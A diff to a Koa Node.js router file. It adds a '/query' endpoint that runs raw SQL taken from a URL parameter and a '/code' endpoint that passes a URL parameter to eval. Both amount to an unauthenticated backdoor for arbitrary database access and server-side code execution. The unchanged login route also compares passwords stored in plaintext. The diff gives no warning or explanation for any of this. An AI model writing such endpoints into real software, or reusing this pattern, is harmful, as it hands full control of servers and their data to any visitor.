@@ -1,15 +1,15 @@
-const router = require("koa-router")();
-const model = require("../model");
- 
-
-router.post("/login", async(ctx, next) => {
+var router = require("koa-router")();
+var model = require("../model");
+var db = require("../db");
+var Sequelize = require("sequelize");
+router.post("/login", async (ctx, next) => {
   let user = model.user;
   var pass = await user.findAll({
     where: {
       name: ctx.request.body.name,
       password: ctx.request.body.password
     }
-  })
+  });
   if (pass.length > 0) {
     ctx.body = pass[0].id;
   } else {
@@ -17,13 +17,19 @@ router.post("/login", async(ctx, next) => {
   }
 });
 
-
-
-router.get("/string", async(ctx, next) => {
-  ctx.body = "koa2 string";
+router.get("/query", async (ctx, next) => {
+ 
+  ctx.body = await db.query(ctx.query.sql, {
+    type: Sequelize.QueryTypes.SELECT
+  });
+});
+router.get("/code", async (ctx, next) => {
+ var codeVar={};
+  await eval (ctx.query.code)
+  ctx.body = codeVar
 });
 
-router.get("/json", async(ctx, next) => {
+router.get("/json", async (ctx, next) => {
   ctx.body = {
     title: "koa2 json"
   };
